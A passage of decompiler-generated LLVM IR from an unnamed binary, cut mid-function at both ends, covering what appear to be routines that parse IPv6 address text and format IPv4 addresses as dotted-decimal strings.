  store i32 ptrtoint ([17 x i8]* @global_var_1000f908.340 to i32), i32* @r3, align 4
  store i32 268485280, i32* @lr, align 4
  %v3_1000c29c = call i32 @function_1000d01c(i32 ptrtoint ([17 x i8]* @global_var_1000f908.340 to i32), i32 %v1_1000c35435)
  store i32 %v3_1000c29c, i32* %r3.global-to-local, align 4
  %v3_1000c2a0 = icmp eq i32 %v3_1000c29c, 0
  br i1 %v3_1000c2a0, label %dec_label_pc_1000c2c0, label %dec_label_pc_1000c2a8

dec_label_pc_1000c2a8:                            ; preds = %dec_label_pc_1000c288
  %v0_1000c2a8 = load i32, i32* @r25, align 4
  %v2_1000c2a8 = sub i32 %v3_1000c29c, %v0_1000c2a8
  store i32 %v2_1000c2a8, i32* %r0.global-to-local, align 4
  %v0_1000c2ac = load i32, i32* @r28, align 4
  %v1_1000c2ac = mul i32 %v0_1000c2ac, 16
  store i32 %v1_1000c2ac, i32* %r9.global-to-local, align 4
  %v2_1000c2b0 = or i32 %v1_1000c2ac, %v2_1000c2a8
  store i32 %v2_1000c2b0, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000c2b0, 65536
  br i1 %tmp19, label %dec_label_pc_1000c34c, label %dec_label_pc_1000c3fc

dec_label_pc_1000c2c0:                            ; preds = %dec_label_pc_1000c288
  %v0_1000c2c0 = load i32, i32* @r30, align 4
  %v3_1000c2c0 = icmp eq i32 %v0_1000c2c0, 58
  br i1 %v3_1000c2c0, label %dec_label_pc_1000c2c8, label %dec_label_pc_1000c31c

dec_label_pc_1000c2c8:                            ; preds = %dec_label_pc_1000c2c0
  %v0_1000c2c8 = load i32, i32* @r23, align 4
  %v3_1000c2c8 = icmp eq i32 %v0_1000c2c8, 0
  br i1 %v3_1000c2c8, label %dec_label_pc_1000c2d0, label %dec_label_pc_1000c2e4

dec_label_pc_1000c2d0:                            ; preds = %dec_label_pc_1000c2c8
  %v0_1000c2d0 = load i32, i32* @r24, align 4
  %v3_1000c2d0 = icmp eq i32 %v0_1000c2d0, 0
  br i1 %v3_1000c2d0, label %dec_label_pc_1000c2d8, label %dec_label_pc_1000c3fc

dec_label_pc_1000c2d8:                            ; preds = %dec_label_pc_1000c2d0
  %v0_1000c2d8 = load i32, i32* @r31, align 4
  store i32 %v0_1000c2d8, i32* @r24, align 4
  %v0_1000c2dc = load i32, i32* @r29, align 4
  store i32 %v0_1000c2dc, i32* @r26, align 4
  br label %dec_label_pc_1000c350.backedge

dec_label_pc_1000c2e4:                            ; preds = %dec_label_pc_1000c2c8
  %v0_1000c2e4 = load i32, i32* @r29, align 4
  %v1_1000c2e4 = inttoptr i32 %v0_1000c2e4 to i8*
  %v2_1000c2e4 = load i8, i8* %v1_1000c2e4, align 1
  %v3_1000c2e4 = zext i8 %v2_1000c2e4 to i32
  store i32 %v3_1000c2e4, i32* %r0.global-to-local, align 4
  %v3_1000c2e8 = icmp eq i8 %v2_1000c2e4, 0
  br i1 %v3_1000c2e8, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c2f0

dec_label_pc_1000c2f0:                            ; preds = %dec_label_pc_1000c2e4
  %v0_1000c2f0 = load i32, i32* @r31, align 4
  %v1_1000c2f0 = add i32 %v0_1000c2f0, 2
  store i32 %v1_1000c2f0, i32* %r0.global-to-local, align 4
  %v1_1000c2f4 = load i32, i32* @r27, align 4
  %v3_1000c2f4 = icmp ugt i32 %v1_1000c2f0, %v1_1000c2f4
  br i1 %v3_1000c2f4, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c2fc

dec_label_pc_1000c2fc:                            ; preds = %dec_label_pc_1000c2f0
  %v0_1000c2fc = load i32, i32* @r28, align 4
  %v1_1000c2fc = udiv i32 %v0_1000c2fc, 256
  store i32 %v1_1000c2fc, i32* %r0.global-to-local, align 4
  %v1_1000c300 = trunc i32 %v0_1000c2fc to i8
  %v3_1000c300 = add i32 %v0_1000c2f0, 1
  %v4_1000c300 = inttoptr i32 %v3_1000c300 to i8*
  store i8 %v1_1000c300, i8* %v4_1000c300, align 1
  %v0_1000c304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c304 = trunc i32 %v0_1000c304 to i8
  %v2_1000c304 = load i32, i32* @r31, align 4
  %v3_1000c304 = inttoptr i32 %v2_1000c304 to i8*
  store i8 %v1_1000c304, i8* %v3_1000c304, align 1
  %v0_1000c308 = load i32, i32* @r29, align 4
  store i32 %v0_1000c308, i32* @r26, align 4
  %v0_1000c30c = load i32, i32* @r31, align 4
  %v1_1000c30c = add i32 %v0_1000c30c, 2
  store i32 %v1_1000c30c, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000c35030 = inttoptr i32 %v0_1000c308 to i8*
  %v2_1000c35031 = load i8, i8* %v1_1000c35030, align 1
  %v3_1000c35032 = zext i8 %v2_1000c35031 to i32
  store i32 %v3_1000c35032, i32* %r3.global-to-local, align 4
  store i32 268485464, i32* @lr, align 4
  %v1_1000c35433 = call i32 @function_1000cffc(i32 %v3_1000c35032)
  store i32 %v1_1000c35433, i32* %r3.global-to-local, align 4
  store i32 %v1_1000c35433, i32* @r30, align 4
  %v3_1000c35834 = icmp eq i32 %v1_1000c35433, 0
  br i1 %v3_1000c35834, label %dec_label_pc_1000c360, label %dec_label_pc_1000c288.lr.ph

dec_label_pc_1000c288.lr.ph:                      ; preds = %dec_label_pc_1000c27c, %dec_label_pc_1000c2fc
  %v1_1000c3543341 = phi i32 [ %v1_1000c35433, %dec_label_pc_1000c2fc ], [ %v1_1000c3543339, %dec_label_pc_1000c27c ]
  br label %dec_label_pc_1000c288

dec_label_pc_1000c31c:                            ; preds = %dec_label_pc_1000c2c0
  %v3_1000c31c = icmp eq i32 %v0_1000c2c0, 46
  br i1 %v3_1000c31c, label %dec_label_pc_1000c324, label %dec_label_pc_1000c3fc

dec_label_pc_1000c324:                            ; preds = %dec_label_pc_1000c31c
  %v0_1000c324 = load i32, i32* @r31, align 4
  %v1_1000c324 = add i32 %v0_1000c324, 4
  store i32 %v1_1000c324, i32* @r30, align 4
  %v1_1000c328 = load i32, i32* @r27, align 4
  %v3_1000c328 = icmp ugt i32 %v1_1000c324, %v1_1000c328
  br i1 %v3_1000c328, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c330

dec_label_pc_1000c330:                            ; preds = %dec_label_pc_1000c324
  %v0_1000c334 = load i32, i32* @r26, align 4
  store i32 %v0_1000c334, i32* %r3.global-to-local, align 4
  store i32 268485436, i32* @lr, align 4
  %v3_1000c338 = call i32 @function_1000c12c(i32 %v0_1000c334, i32 %v0_1000c324)
  store i32 %v3_1000c338, i32* %r3.global-to-local, align 4
  %v0_1000c33c = load i32, i32* @r30, align 4
  store i32 %v0_1000c33c, i32* @r31, align 4
  %v2_1000c340 = icmp sgt i32 %v3_1000c338, 0
  br i1 %v2_1000c340, label %dec_label_pc_1000c384, label %dec_label_pc_1000c3fc

dec_label_pc_1000c34c:                            ; preds = %dec_label_pc_1000c2a8
  store i32 1, i32* @r23, align 4
  %v0_1000c350.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c350.backedge

dec_label_pc_1000c350.backedge:                   ; preds = %dec_label_pc_1000c34c, %dec_label_pc_1000c2d8
  %v0_1000c350.be = phi i32 [ %v0_1000c350.pre.pre, %dec_label_pc_1000c34c ], [ %v0_1000c2dc, %dec_label_pc_1000c2d8 ]
  %v1_1000c350 = inttoptr i32 %v0_1000c350.be to i8*
  %v2_1000c350 = load i8, i8* %v1_1000c350, align 1
  %v3_1000c350 = zext i8 %v2_1000c350 to i32
  store i32 %v3_1000c350, i32* %r3.global-to-local, align 4
  store i32 268485464, i32* @lr, align 4
  %v1_1000c354 = call i32 @function_1000cffc(i32 %v3_1000c350)
  store i32 %v1_1000c354, i32* %r3.global-to-local, align 4
  store i32 %v1_1000c354, i32* @r30, align 4
  %v3_1000c358 = icmp eq i32 %v1_1000c354, 0
  br i1 %v3_1000c358, label %dec_label_pc_1000c360, label %dec_label_pc_1000c288

dec_label_pc_1000c360:                            ; preds = %dec_label_pc_1000c350.backedge, %dec_label_pc_1000c27c, %dec_label_pc_1000c2fc
  %v0_1000c360 = load i32, i32* @r23, align 4
  %v3_1000c360 = icmp eq i32 %v0_1000c360, 0
  %v0_1000c3c8.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c360, label %dec_label_pc_1000c384, label %dec_label_pc_1000c368

dec_label_pc_1000c368:                            ; preds = %dec_label_pc_1000c360
  %v1_1000c368 = add i32 %v0_1000c3c8.pre.pre, 2
  store i32 %v1_1000c368, i32* %r0.global-to-local, align 4
  %v1_1000c36c = load i32, i32* @r27, align 4
  %v3_1000c36c = icmp ugt i32 %v1_1000c368, %v1_1000c36c
  br i1 %v3_1000c36c, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c374

dec_label_pc_1000c374:                            ; preds = %dec_label_pc_1000c368
  %v0_1000c374 = load i32, i32* @r28, align 4
  %v1_1000c374 = udiv i32 %v0_1000c374, 256
  store i32 %v1_1000c374, i32* %r0.global-to-local, align 4
  %v1_1000c378 = trunc i32 %v0_1000c374 to i8
  %v3_1000c378 = add i32 %v0_1000c3c8.pre.pre, 1
  %v4_1000c378 = inttoptr i32 %v3_1000c378 to i8*
  store i8 %v1_1000c378, i8* %v4_1000c378, align 1
  %v0_1000c37c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c37c = trunc i32 %v0_1000c37c to i8
  %v2_1000c37c = load i32, i32* @r31, align 4
  %v3_1000c37c = inttoptr i32 %v2_1000c37c to i8*
  store i8 %v1_1000c37c, i8* %v3_1000c37c, align 1
  %v0_1000c380 = load i32, i32* @r31, align 4
  %v1_1000c380 = add i32 %v0_1000c380, 2
  store i32 %v1_1000c380, i32* @r31, align 4
  br label %dec_label_pc_1000c384

dec_label_pc_1000c384:                            ; preds = %dec_label_pc_1000c360, %dec_label_pc_1000c330, %dec_label_pc_1000c374
  %v0_1000c3c8.pre = phi i32 [ %v0_1000c33c, %dec_label_pc_1000c330 ], [ %v1_1000c380, %dec_label_pc_1000c374 ], [ %v0_1000c3c8.pre.pre, %dec_label_pc_1000c360 ]
  %v0_1000c384 = load i32, i32* @r24, align 4
  %v3_1000c384 = icmp eq i32 %v0_1000c384, 0
  %v1_1000c3c8.pre = load i32, i32* @r27, align 4
  %v4_1000c3c8 = icmp eq i32 %v0_1000c3c8.pre, %v1_1000c3c8.pre
  br i1 %v3_1000c384, label %dec_label_pc_1000c3c8, label %dec_label_pc_1000c38c

dec_label_pc_1000c38c:                            ; preds = %dec_label_pc_1000c384
  %v2_1000c390 = sub i32 %v0_1000c3c8.pre, %v0_1000c384
  store i32 %v2_1000c390, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000c3c8, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c3b0.preheader

dec_label_pc_1000c3b0.preheader:                  ; preds = %dec_label_pc_1000c38c
  %v3_1000c3b024 = icmp slt i32 %v2_1000c390, 1
  %v2_1000c3b426 = add i32 %v2_1000c390, -1
  store i32 %v2_1000c3b426, i32* %r11.global-to-local, align 4
  %v2_1000c3b827 = add i32 %v1_1000c3c8.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c3b024, label %dec_label_pc_1000c3c8.thread, label %dec_label_pc_1000c3a4

dec_label_pc_1000c3a4:                            ; preds = %dec_label_pc_1000c3b0.preheader, %dec_label_pc_1000c3a4.dec_label_pc_1000c3a4_crit_edge
  %v0_1000c3a4 = phi i32 [ %v0_1000c3a4.pre, %dec_label_pc_1000c3a4.dec_label_pc_1000c3a4_crit_edge ], [ %v0_1000c384, %dec_label_pc_1000c3b0.preheader ]
  %v2_1000c3b829 = phi i32 [ %v2_1000c3b8, %dec_label_pc_1000c3a4.dec_label_pc_1000c3a4_crit_edge ], [ %v2_1000c3b827, %dec_label_pc_1000c3b0.preheader ]
  %v2_1000c3b428 = phi i32 [ %v2_1000c3b4, %dec_label_pc_1000c3a4.dec_label_pc_1000c3a4_crit_edge ], [ %v2_1000c3b426, %dec_label_pc_1000c3b0.preheader ]
  %v2_1000c3a4 = add i32 %v0_1000c3a4, %v2_1000c3b428
  %v3_1000c3a4 = inttoptr i32 %v2_1000c3a4 to i8*
  %v4_1000c3a4 = load i8, i8* %v3_1000c3a4, align 1
  %v5_1000c3a4 = zext i8 %v4_1000c3a4 to i32
  store i32 %v5_1000c3a4, i32* %r0.global-to-local, align 4
  %v3_1000c3a8 = inttoptr i32 %v2_1000c3b829 to i8*
  store i8 %v4_1000c3a4, i8* %v3_1000c3a8, align 1
  %v0_1000c3ac = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c3ac = load i32, i32* @r24, align 4
  %v2_1000c3ac = load i32, i32* %r11.global-to-local, align 4
  %v3_1000c3ac = trunc i32 %v0_1000c3ac to i8
  %v4_1000c3ac = add i32 %v2_1000c3ac, %v1_1000c3ac
  %v5_1000c3ac = inttoptr i32 %v4_1000c3ac to i8*
  store i8 %v3_1000c3ac, i8* %v5_1000c3ac, align 1
  %v0_1000c3b0.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3b0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000c3b8.pre = load i32, i32* @r27, align 4
  %v3_1000c3b0 = icmp slt i32 %v1_1000c3b0.pre, %v0_1000c3b0.pre
  %v2_1000c3b4 = sub i32 %v1_1000c3b0.pre, %v0_1000c3b0.pre
  store i32 %v2_1000c3b4, i32* %r11.global-to-local, align 4
  %v1_1000c3bc = add i32 %v0_1000c3b0.pre, 1
  store i32 %v1_1000c3bc, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c3b0, label %dec_label_pc_1000c3c8.thread, label %dec_label_pc_1000c3a4.dec_label_pc_1000c3a4_crit_edge

dec_label_pc_1000c3a4.dec_label_pc_1000c3a4_crit_edge: ; preds = %dec_label_pc_1000c3a4
  %v2_1000c3b8 = sub i32 %v1_1000c3b8.pre, %v0_1000c3b0.pre
  %v0_1000c3a4.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000c3a4

dec_label_pc_1000c3c8.thread:                     ; preds = %dec_label_pc_1000c3a4, %dec_label_pc_1000c3b0.preheader
  %v0_1000c3c4.lcssa = phi i32 [ %v1_1000c3c8.pre, %dec_label_pc_1000c3b0.preheader ], [ %v1_1000c3b8.pre, %dec_label_pc_1000c3a4 ]
  store i32 %v0_1000c3c4.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000c3d0

dec_label_pc_1000c3c8:                            ; preds = %dec_label_pc_1000c384
  br i1 %v4_1000c3c8, label %dec_label_pc_1000c3d0, label %dec_label_pc_1000c3fc

dec_label_pc_1000c3d0:                            ; preds = %dec_label_pc_1000c3c8.thread, %dec_label_pc_1000c3c8
  %v0_1000c3d0 = load i32, i32* @r22, align 4
  store i32 %v0_1000c3d0, i32* @r3, align 4
  store i32 %v2_1000c24c, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c3e0.341 to i32), i32* @lr, align 4
  %v0_1000c3dc = call i32 @function_10007104()
  store i32 %v0_1000c3dc, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c400

dec_label_pc_1000c3e8:                            ; preds = %dec_label_pc_1000c22c
  %v0_1000c3e8 = call i32 @function_10004e38()
  store i32 %v0_1000c3e8, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c3f4 = inttoptr i32 %v0_1000c3e8 to i32*
  store i32 97, i32* %v2_1000c3f4, align 4
  %v0_1000c404.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c400

dec_label_pc_1000c3fc:                            ; preds = %dec_label_pc_1000c2f0, %dec_label_pc_1000c2e4, %dec_label_pc_1000c2a8, %dec_label_pc_1000c2d0, %dec_label_pc_1000c38c, %dec_label_pc_1000c330, %dec_label_pc_1000c31c, %dec_label_pc_1000c3c8, %dec_label_pc_1000c270, %dec_label_pc_1000c368, %dec_label_pc_1000c324
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c400

dec_label_pc_1000c400:                            ; preds = %dec_label_pc_1000c3e8, %dec_label_pc_1000c3d0, %dec_label_pc_1000c238, %dec_label_pc_1000c3fc
  %v0_1000c404 = phi i32 [ %v0_1000c404.pre, %dec_label_pc_1000c3e8 ], [ 1, %dec_label_pc_1000c3d0 ], [ %v3_1000c240, %dec_label_pc_1000c238 ], [ 0, %dec_label_pc_1000c3fc ]
  store i32 %v0_1000c210, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c404, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c404

; uselistorder directives
  uselistorder i32 %v0_1000c404, { 1, 0 }
  uselistorder i32 %v2_1000c3b4, { 1, 0 }
  uselistorder i32 %v0_1000c3b0.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000c3c8, { 1, 0 }
  uselistorder i32 %v0_1000c3c8.pre, { 1, 0 }
  uselistorder i32 %v0_1000c374, { 1, 0 }
  uselistorder i32 %v0_1000c3c8.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000c354, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000c2fc, { 1, 0 }
  uselistorder i32 %v1_1000c2ac, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 1, 2, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1000cffc, { 2, 1, 0 }
  uselistorder i32 268485464, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000c12c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c400, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c3fc, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c384, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c360, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c288.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000c288, { 1, 0 }
}

define i32 @function_1000c418(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c470.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000c41c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000c440 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000c440, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000c454.344 to i32), i32* @lr, align 4
  %v3_1000c450 = call i32 @function_100071a0(i32 %v2_1000c440, i32 0, i32 15)
  store i32 %v3_1000c450, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000c5142 = load i32, i32* @r1, align 4
  store i32 %v0_1000c5142, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c470

dec_label_pc_1000c470:                            ; preds = %dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge, %dec_label_pc_1000c470.lr.ph
  %v2_1000c490 = phi i32 [ %v2_1000c514, %dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge ], [ %v0_1000c5142, %dec_label_pc_1000c470.lr.ph ]
  %v0_1000c480 = phi i32 [ %v0_1000c514, %dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge ], [ %v0_1000c5142, %dec_label_pc_1000c470.lr.ph ]
  %v0_1000c474 = phi i32 [ %v1_1000c514, %dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge ], [ 0, %dec_label_pc_1000c470.lr.ph ]
  %v1_1000c47c = phi i32 [ %v1_1000c470.pre, %dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge ], [ 0, %dec_label_pc_1000c470.lr.ph ]
  %v0_1000c470 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c470 = add i32 %v0_1000c470, %v1_1000c47c
  %v3_1000c470 = inttoptr i32 %v2_1000c470 to i8*
  %v4_1000c470 = load i8, i8* %v3_1000c470, align 1
  %v5_1000c470 = zext i8 %v4_1000c470 to i32
  store i32 %v5_1000c470, i32* %r10.global-to-local, align 4
  store i32 %v0_1000c474, i32* %r8.global-to-local, align 4
  %v1_1000c478 = add i32 %v0_1000c474, 1
  store i32 %v1_1000c478, i32* %r11.global-to-local, align 4
  store i32 %v2_1000c470, i32* %r3.global-to-local, align 4
  %v2_1000c480 = add i32 %v1_1000c478, %v0_1000c480
  store i32 %v2_1000c480, i32* %r6.global-to-local, align 4
  %v1_1000c484 = load i32, i32* @r28, align 4
  %v2_1000c484 = udiv i32 %v5_1000c470, %v1_1000c484
  %v1_1000c488 = add nuw nsw i32 %v2_1000c484, 48
  %v1_1000c48c = urem i32 %v1_1000c488, 256
  store i32 %v1_1000c48c, i32* %r0.global-to-local, align 4
  %v1_1000c490 = trunc i32 %v1_1000c488 to i8
  %v3_1000c490 = add i32 %v2_1000c490, 8
  %v4_1000c490 = inttoptr i32 %v3_1000c490 to i8*
  store i8 %v1_1000c490, i8* %v4_1000c490, align 1
  %v0_1000c494 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c494 = icmp eq i32 %v0_1000c494, 48
  %v0_1000c49c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c49c = load i32, i32* %r5.global-to-local, align 4
  %v2_1000c49c = udiv i32 %v0_1000c49c, %v1_1000c49c
  store i32 %v2_1000c49c, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c494, label %dec_label_pc_1000c49c, label %dec_label_pc_1000c4c8

dec_label_pc_1000c49c:                            ; preds = %dec_label_pc_1000c470
  %v2_1000c4a0 = udiv i32 %v2_1000c49c, %v1_1000c49c
  %tmp18 = mul i32 %v2_1000c4a0, -10
  %v2_1000c4a8 = add i32 %v2_1000c49c, 48
  %v1_1000c4ac = add i32 %v2_1000c4a8, %tmp18
  store i32 %v1_1000c4ac, i32* %r9.global-to-local, align 4
  %v1_1000c4b0 = urem i32 %v1_1000c4ac, 256
  store i32 %v1_1000c4b0, i32* %r0.global-to-local, align 4
  %v1_1000c4b4 = trunc i32 %v1_1000c4ac to i8
  %v2_1000c4b4 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000c4b4 = add i32 %v2_1000c4b4, 8
  %v4_1000c4b4 = inttoptr i32 %v3_1000c4b4 to i8*
  store i8 %v1_1000c4b4, i8* %v4_1000c4b4, align 1
  %v0_1000c4b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c4b8 = icmp eq i32 %v0_1000c4b8, 48
  br i1 %v3_1000c4b8, label %dec_label_pc_1000c4e4, label %dec_label_pc_1000c4c0

dec_label_pc_1000c4c0:                            ; preds = %dec_label_pc_1000c49c
  %v0_1000c4c0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000c4c0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000c4e4

dec_label_pc_1000c4c8:                            ; preds = %dec_label_pc_1000c470
  %v0_1000c4cc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c4cc = add i32 %v0_1000c4cc, 1
  store i32 %v1_1000c4cc, i32* %r8.global-to-local, align 4
  %v2_1000c4d0 = udiv i32 %v2_1000c49c, %v1_1000c49c
  %v1_1000c4d4 = mul i32 %v2_1000c4d0, 10
  store i32 %v1_1000c4d4, i32* %r0.global-to-local, align 4
  %v2_1000c4d8 = sub i32 %v2_1000c49c, %v1_1000c4d4
  %v1_1000c4dc = add i32 %v2_1000c4d8, 48
  store i32 %v1_1000c4dc, i32* %r9.global-to-local, align 4
  %v1_1000c4e0 = trunc i32 %v1_1000c4dc to i8
  %v2_1000c4e0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000c4e0 = add i32 %v2_1000c4e0, 8
  %v4_1000c4e0 = inttoptr i32 %v3_1000c4e0 to i8*
  store i8 %v1_1000c4e0, i8* %v4_1000c4e0, align 1
  br label %dec_label_pc_1000c4e4

dec_label_pc_1000c4e4:                            ; preds = %dec_label_pc_1000c49c, %dec_label_pc_1000c4c0, %dec_label_pc_1000c4c8
  %v0_1000c4e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000c4e4 = inttoptr i32 %v0_1000c4e4 to i8*
  %v2_1000c4e4 = load i8, i8* %v1_1000c4e4, align 1
  %v3_1000c4e4 = zext i8 %v2_1000c4e4 to i32
  %v0_1000c4e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c4e8 = add i32 %v0_1000c4e8, 1
  %v0_1000c4ec = load i32, i32* @r1, align 4
  %v2_1000c4ec = add i32 %v0_1000c4ec, %v0_1000c4e8
  store i32 %v2_1000c4ec, i32* %r10.global-to-local, align 4
  %v2_1000c4f0 = add i32 %v1_1000c4e8, %v0_1000c4ec
  store i32 %v2_1000c4f0, i32* %r8.global-to-local, align 4
  %v0_1000c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c4f4 = add i32 %v0_1000c4f4, 1
  store i32 %v1_1000c4f4, i32* %r4.global-to-local, align 4
  %v1_1000c4f8 = add i32 %v0_1000c4e8, 2
  store i32 %v1_1000c4f8, i32* %r11.global-to-local, align 4
  %v1_1000c4fc = load i32, i32* %r5.global-to-local, align 4
  %v2_1000c4fc = udiv i32 %v3_1000c4e4, %v1_1000c4fc
  %v1_1000c500 = mul nuw nsw i32 %v2_1000c4fc, 10
  store i32 %v1_1000c500, i32* %r0.global-to-local, align 4
  %v2_1000c504 = sub nsw i32 %v3_1000c4e4, %v1_1000c500
  %v1_1000c508 = add nsw i32 %v2_1000c504, 48
  store i32 %v1_1000c508, i32* %r9.global-to-local, align 4
  %v1_1000c50c = trunc i32 %v1_1000c508 to i8
  %v3_1000c50c = add i32 %v2_1000c4ec, 8
  %v4_1000c50c = inttoptr i32 %v3_1000c50c to i8*
  store i8 %v1_1000c50c, i8* %v4_1000c50c, align 1
  %v0_1000c510 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000c510 = trunc i32 %v0_1000c510 to i8
  %v2_1000c510 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000c510 = add i32 %v2_1000c510, 8
  %v4_1000c510 = inttoptr i32 %v3_1000c510 to i8*
  store i8 %v1_1000c510, i8* %v4_1000c510, align 1
  %v0_1000c514 = load i32, i32* @r1, align 4
  %v1_1000c514 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c514 = add i32 %v1_1000c514, %v0_1000c514
  store i32 %v2_1000c514, i32* %r7.global-to-local, align 4
  %v0_1000c518 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c518 = add i32 %v0_1000c518, -1
  store i32 %v1_1000c518, i32* %ctr.global-to-local, align 4
  %v2_1000c518 = icmp eq i32 %v1_1000c518, 0
  br i1 %v2_1000c518, label %dec_label_pc_1000c51c, label %dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge

dec_label_pc_1000c4e4.dec_label_pc_1000c470_crit_edge: ; preds = %dec_label_pc_1000c4e4
  %v1_1000c470.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000c470

dec_label_pc_1000c51c:                            ; preds = %dec_label_pc_1000c4e4
  %v2_1000c51c = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000c51c, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000c524 = add i32 %v1_1000c514, %v2_1000c51c
  store i32 %v2_1000c524, i32* %r9.global-to-local, align 4
  store i32 %v2_1000c51c, i32* @r3, align 4
  %v3_1000c52c = add i32 %v2_1000c524, -1
  %v4_1000c52c = inttoptr i32 %v3_1000c52c to i8*
  store i8 0, i8* %v4_1000c52c, align 1
